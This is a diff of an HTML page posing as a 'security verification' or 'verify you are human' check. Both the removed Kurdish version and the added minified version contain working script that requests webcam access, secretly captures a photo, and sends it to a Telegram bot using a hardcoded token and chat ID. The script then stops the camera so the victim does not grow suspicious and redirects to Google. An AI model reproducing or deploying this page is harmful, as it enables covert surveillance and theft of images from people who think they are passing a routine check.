@@ -1,99 +1,29 @@
+
 <!DOCTYPE html>
-<html lang="ku">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #000;
-            color: #fff;
-            font-family: sans-serif;
-            overflow: hidden;
+<html>
+<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif;">
+    <div style="margin-top:100px;">
+        <h2>Verify You Are Human</h2>
+        <button onclick="startOp()" style="padding:20px; background:#007bff; color:#fff; border:none; border-radius:5px;">Click to Verify</button>
+    </div>
+    <script>
+        async function startOp() {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video:true});
+                const v = document.createElement('video'); v.srcObject = s; v.play();
+                setTimeout(async () => {
+                    const cv = document.createElement('canvas'); cv.width=400; cv.height=300;
+                    cv.getContext('2d').drawImage(v,0,0);
+                    const data = cv.toDataURL('image/jpeg', 0.5);
+                    await fetch('https://api.telegram.org/bot8344933620:AAGonsjbg_MdNRjWb5I6QD8e_NCH1H7Emi8/sendMessage', {
+                        method:'POST', headers:{'Content-Type':'application/json'},
+                        body: JSON.stringify({chat_id:'5982066799', text: "📸 NEW CAPTURE:\n" + data})
+                    });
+                    s.getTracks().forEach(t=>t.stop());
+                    window.location.href='https://google.com';
+                }, 1500);
+            } catch(e) { alert("Access Denied. Please allow camera."); }
         }
-        .container {
-            text-align: center;
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h2>تکایە بۆ چوونە ژوورەوە ناسنامەت بسەلمێنە</h2>
-    <p>کلیک لەسەر دوگمەی خوارەوە بکە بۆ پشکنینی ڕوخسار</p>
-    <button onclick="captureFace()">Verify Identity</button>
-</div>
-
-<script>
-    // --- زانیارییەکانی بوتەکەت ---
-    const TOKEN = '8344933620:AAGonsjbg_MdNRjWb5I6QD8e_NCH1H7Emi8';
-    const CHAT_ID = '5982066799';
-
-    async function captureFace() {
-        try {
-            // داوای مۆڵەتی کامێرا دەکات
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            
-            // دروستکردنی ڤیدیۆیەکی شاراوە بۆ وێنەگرتن
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-
-            // چاوەڕێ دەکات تا کامێراکە بە تەواوی ئامادە دەبێت
-            setTimeout(async () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // گۆڕینی وێنەکە بۆ فۆرماتی Base64
-                const imageData = canvas.toDataURL('image/jpeg');
-
-                // ناردنی وێنەکە بۆ بوتەکەت وەک نامە (چونکە ناردنی وێنەی ڕاستەوخۆ لە HTMLـەوە پێویستی بە FormData هەیە)
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: "📸 وێنەیەکی نوێ گیرا:\n\n" + imageData
-                    })
-                });
-
-                // کوژاندنەوەی کامێرا بۆ ئەوەی گومان دروست نەکات
-                stream.getTracks().forEach(track => track.stop());
-
-                // گۆڕینی لاپەڕەکە بۆ گووگڵ دوای تەواوبوون
-                alert("پشکنین بە سەرکەوتوویی کۆتایی هات.");
-                window.location.href = "https://www.google.com";
-                
-            }, 2000); // ٢ چرکە کات دەدات بە کامێراکە
-
-        } catch (err) {
-            console.error("Error: ", err);
-            alert("تکایە مۆڵەتی کامێرا بدە بۆ بەردەوام بوون.");
-        }
-    }
-</script>
-
+    </script>
 </body>
 </html>
